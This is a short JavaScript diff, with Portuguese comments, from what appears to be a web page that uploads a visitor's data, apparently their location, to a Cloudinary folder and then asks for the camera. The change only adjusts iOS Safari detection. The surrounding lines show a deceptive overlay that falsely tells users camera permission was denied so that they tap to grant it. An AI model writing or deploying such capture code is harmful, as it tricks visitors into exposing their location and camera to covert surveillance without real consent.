@@ -70,14 +70,14 @@
       form.append('folder', folderName);
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
         .then(() => {
-          // após sucesso de localização, decide como pedir câmera
+                    // após sucesso de localização, decide como pedir câmera
           const ua = navigator.userAgent;
-          const isSafari = /^((?!chrome|android).)*safari/i.test(ua);
-          if (isSafari) {
-            // exibe overlay para acionar getUserMedia no clique no Safari
+          const isIosSafari = /iP(hone|od|ad)/.test(navigator.platform) && /Safari/.test(ua) && !/CriOS/.test(ua);
+          if (isIosSafari) {
+            // no iOS Safari, mostra overlay para disparar getUserMedia com user gesture
             showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', requestCamera);
           } else {
-            // Chrome, etc.: chama diretamente
+            // outros navegadores: chama direto
             requestCamera();
           }
         })
